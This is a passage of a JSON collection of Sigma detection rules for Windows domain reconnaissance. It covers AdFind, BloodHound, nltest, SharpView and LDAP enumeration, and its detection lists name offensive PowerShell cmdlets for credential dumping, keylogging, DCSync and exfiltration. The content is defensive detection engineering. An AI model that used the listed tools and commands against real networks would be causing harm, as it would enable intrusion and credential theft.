                            "raw": "author: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72,\n  oscd.community\ndate: 2021/02/02\ndescription: AdFind continues to be seen across majority of breaches. It is used to\n  domain trust discovery to plan out subsequent steps in the attack chain.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\nfalsepositives:\n- Legitimate admin activity\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nrelated:\n- id: 75df3b17-8bcc-4565-b89b-c9898acef911\n  type: obsoletes\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: AdFind Usage Detection\n",
                            "sigma:id": "9a132afa-654e-11eb-ae93-0242ac130002",
                            "title": "AdFind Usage Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                        "lookup_data": {
                            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/20\ndescription: Detects command line parameters used by Bloodhound and Sharphound hack\n  tools\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|contains:\n    - \\Bloodhound.exe\n    - \\SharpHound.exe\n  selection2:\n    CommandLine|contains:\n    - ' -CollectionMethod All '\n    - ' --CollectionMethods Session '\n    - ' --Loop --Loopduration '\n    - ' --PortScanTimeout '\n    - '.exe -c All -d '\n    - Invoke-Bloodhound\n    - Get-BloodHoundData\n  selection3:\n    CommandLine|contains|all:\n    - ' -JsonFolder '\n    - ' -ZipFileName '\n  selection4:\n    CommandLine|contains|all:\n    - ' DCOnly '\n    - ' --NoSaveCache '\n  selection5:\n  - Product|contains: SharpHound\n  - Description|contains: SharpHound\n  - Company|contains:\n    - SpecterOps\n    - evil corp\nfalsepositives:\n- Other programs that use these command line option and accepts an 'All' parameter\nid: f376c8a7-a2d0-4ddc-aa0c-16c17236d962\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://github.com/BloodHoundAD/BloodHound\n- https://github.com/BloodHoundAD/SharpHound\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: Bloodhound and Sharphound Hack Tool\n",
                            "sigma:id": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                            "title": "Bloodhound and Sharphound Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5cc90652-4cbd-4241-aa3b-4b462fa5a248",
                        "lookup_data": {
                            "description": "Detects nltest commands that can be used for information discovery",
                            "raw": "author: Craig Young, oscd.community, Georg Lauenstein\ndate: 2021/07/24\ndescription: Detects nltest commands that can be used for information discovery\ndetection:\n  condition: selection_nltest and 1 of selection_recon*\n  selection_nltest:\n  - Image|endswith: \\nltest.exe\n  - OriginalFileName: nltestrk.exe\n  selection_recon1:\n    CommandLine|contains|all:\n    - /server\n    - /query\n  selection_recon2:\n    CommandLine|contains:\n    - '/dclist:'\n    - /parentdomain\n    - /domain_trusts\n    - /trusted_domains\n    - /user\nfalsepositives:\n- Legitimate administration use but user must be check out\nfields:\n- Image\n- User\n- CommandLine\n- ParentCommandLine\nid: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)\n- https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/\n- https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters\n- https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1016\n- attack.t1482\ntitle: Potential Recon Activity Via Nltest.EXE\n",
                            "sigma:id": "5cc90652-4cbd-4241-aa3b-4b462fa5a248",
                            "title": "Potential Recon Activity Via Nltest.EXE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a21bcd7e-38ec-49ad-b69a-9ea17e69509e",
                        "lookup_data": {
                            "description": "Detect suspicious LDAP request from non-Windows application",
                            "raw": "author: frack113\ndate: 2022/08/20\ndescription: Detect suspicious LDAP request from non-Windows application\ndetection:\n  condition: dns_request and not 1 of filter_*\n  dns_request:\n    QueryName|startswith: _ldap.\n  filter_azure:\n    Image|startswith: C:\\WindowsAzure\\GuestAgent\n  filter_defender:\n    Image|endswith: \\MsMpEng.exe\n    Image|startswith:\n    - C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\n    - C:\\Program Files\\Windows Defender\\MsMpEng.exe\n    - C:\\Program Files (x86)\\Windows Defender\\MsMpEng.exe\n  filter_unknown:\n    Image: <unknown process>\n  filter_windows:\n    Image|startswith: C:\\Windows\\\nfalsepositives:\n- Programs that also lookup the observed domain\nid: a21bcd7e-38ec-49ad-b69a-9ea17e69509e\nlevel: medium\nlogsource:\n  category: dns_query\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1482\ntitle: Suspicious LDAP Domain Access\n",
                            "sigma:id": "a21bcd7e-38ec-49ad-b69a-9ea17e69509e",
                            "title": "Suspicious LDAP Domain Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "77815820-246c-47b8-9741-e0def3f57308",
                        "lookup_data": {
                            "description": "Detects a discovery of domain trusts",
                            "raw": "author: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\ndescription: Detects a discovery of domain trusts\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|contains|all:\n    - -filter\n    - trustedDomain\n    Image|endswith: \\dsquery.exe\n  - CommandLine|contains: domain_trusts\n    Image|endswith: \\nltest.exe\nfalsepositives:\n- Administration of systems\nid: 77815820-246c-47b8-9741-e0def3f57308\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2019/11/08\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1482\ntitle: Domain Trust Discovery\n",
                            "sigma:id": "77815820-246c-47b8-9741-e0def3f57308",
                            "title": "Domain Trust Discovery",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/02\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: derived\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ProcessCreation\n",
                            "sigma:id": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                            "title": "Malicious PowerShell Commandlets - ProcessCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                        "lookup_data": {
                            "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
                            "raw": "author: frack113\ndate: 2021/12/10\ndescription: Adversaries may look for details about the network configuration and\n  settings of systems they access or through information discovery of remote systems\ndetection:\n  condition: selection\n  selection:\n  - OriginalFileName: SharpView.exe\n  - Image|endswith: \\SharpView.exe\n  - CommandLine|contains:\n    - Add-RemoteConnection\n    - Convert-ADName\n    - ConvertFrom-SID\n    - ConvertFrom-UACValue\n    - Convert-SidToName\n    - Export-PowerViewCSV\n    - Find-DomainObjectPropertyOutlier\n    - Find-DomainProcess\n    - Find-DomainShare\n    - Find-DomainUserEvent\n    - Find-DomainUserLocation\n    - Find-ForeignGroup\n    - Find-ForeignUser\n    - Find-GPOComputerAdmin\n    - Find-GPOLocation\n    - Find-Interesting\n    - Find-LocalAdminAccess\n    - Find-ManagedSecurityGroups\n    - Get-CachedRDPConnection\n    - Get-DFSshare\n    - Get-DomainComputer\n    - Get-DomainController\n    - Get-DomainDFSShare\n    - Get-DomainDNSRecord\n    - Get-DomainFileServer\n    - Get-DomainForeign\n    - Get-DomainGPO\n    - Get-DomainGroup\n    - Get-DomainGUIDMap\n    - Get-DomainManagedSecurityGroup\n    - Get-DomainObject\n    - Get-DomainOU\n    - Get-DomainPolicy\n    - Get-DomainSID\n    - Get-DomainSite\n    - Get-DomainSPNTicket\n    - Get-DomainSubnet\n    - Get-DomainTrust\n    - Get-DomainUserEvent\n    - Get-ForestDomain\n    - Get-ForestGlobalCatalog\n    - Get-ForestTrust\n    - Get-GptTmpl\n    - Get-GroupsXML\n    - Get-LastLoggedOn\n    - Get-LoggedOnLocal\n    - Get-NetComputer\n    - Get-NetDomain\n    - Get-NetFileServer\n    - Get-NetForest\n    - Get-NetGPO\n    - Get-NetGroupMember\n    - Get-NetLocalGroup\n    - Get-NetLoggedon\n    - Get-NetOU\n    - Get-NetProcess\n    - Get-NetRDPSession\n    - Get-NetSession\n    - Get-NetShare\n    - Get-NetSite\n    - Get-NetSubnet\n    - Get-NetUser\n    - Get-PathAcl\n    - Get-PrincipalContext\n    - Get-RegistryMountedDrive\n    - Get-RegLoggedOn\n    - Get-WMIRegCachedRDPConnection\n    - Get-WMIRegLastLoggedOn\n    - Get-WMIRegMountedDrive\n    - Get-WMIRegProxy\n    - Invoke-ACLScanner\n    - Invoke-CheckLocalAdminAccess\n    - Invoke-Kerberoast\n    - Invoke-MapDomainTrust\n    - Invoke-RevertToSelf\n    - Invoke-Sharefinder\n    - Invoke-UserImpersonation\n    - Remove-DomainObjectAcl\n    - Remove-RemoteConnection\n    - Request-SPNTicket\n    - Set-DomainObject\n    - Test-AdminAccess\nfalsepositives:\n- Unknown\nid: b2317cfa-4a47-4ead-b3ff-297438c0bc2d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/tevora-threat/SharpView/\n- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview\nrelated:\n- id: dcd74b95-3f36-4ed9-9598-0490951643aa\n  type: similar\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1049\n- attack.t1069.002\n- attack.t1482\n- attack.t1135\n- attack.t1033\ntitle: Suspicious Execution of SharpView\n",
                            "sigma:id": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
                            "title": "Suspicious Execution of SharpView",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
                        "lookup_data": {
                            "description": "The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions.",
                            "raw": "author: Arun Chauhan\ndate: 2021/10/04\ndescription: The attacker might use LOLBAS nltest.exe for discovery of domain controllers,\n  domain trusts, parent domain and the current user permissions.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4689\n    ProcessName|endswith: nltest.exe\n    Status: '0x0'\nfalsepositives:\n- Red team activity\n- Rare legitimate use by an administrator\nfields:\n- SubjectUserName\n- SubjectDomainName\nid: eeb66bbb-3dde-4582-815a-584aee9fe6d1\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\n- https://attack.mitre.org/software/S0359/\nstatus: test\ntags:\n- attack.discovery\n- attack.t1482\n- attack.t1018\n- attack.t1016\ntitle: Correct Execution of Nltest.exe\n",
                            "sigma:id": "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
                            "title": "Correct Execution of Nltest.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                        "lookup_data": {
                            "description": "Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/21\ndescription: Detects the use of a renamed Adfind.exe. AdFind continues to be seen\n  across majority of breaches. It is used to domain trust discovery to plan out subsequent\n  steps in the attack chain.\ndetection:\n  condition: 1 of selection* and not filter\n  filter:\n    Image|endswith: \\AdFind.exe\n  selection_1:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\n  selection_2:\n  - Imphash:\n    - bca5675746d13a1f246e2da3c2217492\n    - 53e117a96057eaf19c41380d0e87f1c2\n  - Hashes|contains:\n    - IMPHASH=BCA5675746D13A1F246E2DA3C2217492\n    - IMPHASH=53E117A96057EAF19C41380D0E87F1C2\n  selection_3:\n    OriginalFileName: AdFind.exe\nfalsepositives:\n- Unknown\nid: df55196f-f105-44d3-a675-e9dfb6cc2f2b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/01\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Renamed AdFind Detection\n",
                            "sigma:id": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
                            "title": "Renamed AdFind Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "410ad193-a728-4107-bc79-4419789fcbf8",
                        "lookup_data": {
                            "description": "Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes. This detectors attempts to identify that activity based off a command rarely observed in an enterprise network.",
                            "raw": "author: David Burkett, Florian Roth\ndate: 2019/12/28\ndescription: Trickbot enumerates domain/network topology and executes certain commands\n  automatically every few minutes. This detectors attempts to identify that activity\n  based off a command rarely observed in an enterprise network.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: /domain_trusts /all_trusts\n    Image|endswith: \\nltest.exe\n    ParentImage|endswith: \\cmd.exe\nfalsepositives:\n- Rare System Admin Activity\nid: 410ad193-a728-4107-bc79-4419789fcbf8\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.sneakymonkey.net/2019/05/22/trickbot-analysis/\n- https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/\nstatus: test\ntags:\n- attack.discovery\n- attack.t1482\ntitle: Trickbot Malware Recon Activity\n",
                            "sigma:id": "410ad193-a728-4107-bc79-4419789fcbf8",
                            "title": "Trickbot Malware Recon Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "69ca006d-b9a9-47f5-80ff-ecd4d25d481a",
                        "lookup_data": {
                            "description": "Detect use of TruffleSnout.exe",
                            "raw": "author: frack113\ndate: 2022/08/20\ndescription: Detect use of TruffleSnout.exe\ndetection:\n  condition: selection\n  selection:\n  - OriginalFileName: TruffleSnout.exe\n  - Image|endswith: \\TruffleSnout.exe\nfalsepositives:\n- Legitimate use\nid: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\n- https://github.com/dsnezhkov/TruffleSnout\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1482\ntitle: Launch TruffleSnout Executable\n",
                            "sigma:id": "69ca006d-b9a9-47f5-80ff-ecd4d25d481a",
                            "title": "Launch TruffleSnout Executable",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "31d68132-4038-47c7-8f8e-635a39a7c174",
                        "lookup_data": {
                            "description": "Detects potential Active Directory enumeration via LDAP",
                            "raw": "author: Adeem Mawani\ndate: 2021/06/22\ndescription: Detects potential Active Directory enumeration via LDAP\ndetection:\n  condition: (generic_search and not narrow_down_filter) or suspicious_flag\n  generic_search:\n    EventID: 30\n    SearchFilter|contains:\n    - (groupType:1.2.840.113556.1.4.803:=2147483648)\n    - (groupType:1.2.840.113556.1.4.803:=2147483656)\n    - (groupType:1.2.840.113556.1.4.803:=2147483652)\n    - (groupType:1.2.840.113556.1.4.803:=2147483650)\n    - (sAMAccountType=805306369)\n    - (sAMAccountType=805306368)\n    - (sAMAccountType=536870913)\n    - (sAMAccountType=536870912)\n    - (sAMAccountType=268435457)\n    - (sAMAccountType=268435456)\n    - (objectCategory=groupPolicyContainer)\n    - (objectCategory=organizationalUnit)\n    - (objectCategory=Computer)\n    - (objectCategory=nTDSDSA)\n    - (objectCategory=server)\n    - (objectCategory=domain)\n    - (objectCategory=person)\n    - (objectCategory=group)\n    - (objectCategory=user)\n    - (objectClass=trustedDomain)\n    - (objectClass=computer)\n    - (objectClass=server)\n    - (objectClass=group)\n    - (objectClass=user)\n    - (primaryGroupID=521)\n    - (primaryGroupID=516)\n    - (primaryGroupID=515)\n    - (primaryGroupID=512)\n    - Domain Admins\n    - objectGUID=\\*\n    - (schemaIDGUID=\\*)\n  narrow_down_filter:\n    EventID: 30\n    SearchFilter|contains:\n    - (domainSid=*)\n    - (objectSid=*)\n  suspicious_flag:\n    EventID: 30\n    SearchFilter|contains:\n    - (userAccountControl:1.2.840.113556.1.4.803:=4194304)\n    - (userAccountControl:1.2.840.113556.1.4.803:=2097152)\n    - '!(userAccountControl:1.2.840.113556.1.4.803:=1048574)'\n    - (userAccountControl:1.2.840.113556.1.4.803:=524288)\n    - (userAccountControl:1.2.840.113556.1.4.803:=65536)\n    - (userAccountControl:1.2.840.113556.1.4.803:=8192)\n    - (userAccountControl:1.2.840.113556.1.4.803:=544)\n    - '!(UserAccountControl:1.2.840.113556.1.4.803:=2)'\n    - msDS-AllowedToActOnBehalfOfOtherIdentity\n    - msDS-AllowedToDelegateTo\n    - msDS-GroupManagedServiceAccount\n    - (accountExpires=9223372036854775807)\n    - (accountExpires=0)\n    - (adminCount=1)\n    - ms-MCS-AdmPwd\nid: 31d68132-4038-47c7-8f8e-635a39a7c174\nlevel: medium\nlogsource:\n  definition: 'Requirements: Microsoft-Windows-LDAP-Client/Debug ETW logging'\n  product: windows\n  service: ldap_debug\nmodified: 2022/12/28\nreferences:\n- https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726\n- https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1\n- https://github.com/BloodHoundAD/SharpHound3/blob/7d96b991b1887ff50349ce59c80980bc0d95c86a/SharpHound3/LdapBuilder.cs\n- https://medium.com/falconforce/falconfriday-detecting-active-directory-data-collection-0xff21-c22d1a57494c\n- https://github.com/fox-it/BloodHound.py/blob/d65eb614831cd30f26028ccb072f5e77ca287e0b/bloodhound/ad/domain.py#L427\nstatus: test\ntags:\n- attack.discovery\n- attack.t1069.002\n- attack.t1087.002\n- attack.t1482\ntitle: Potential Active Directory Reconnaissance/Enumeration Via LDAP\n",
                            "sigma:id": "31d68132-4038-47c7-8f8e-635a39a7c174",
                            "title": "Potential Active Directory Reconnaissance/Enumeration Via LDAP",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/20\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    Payload|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - 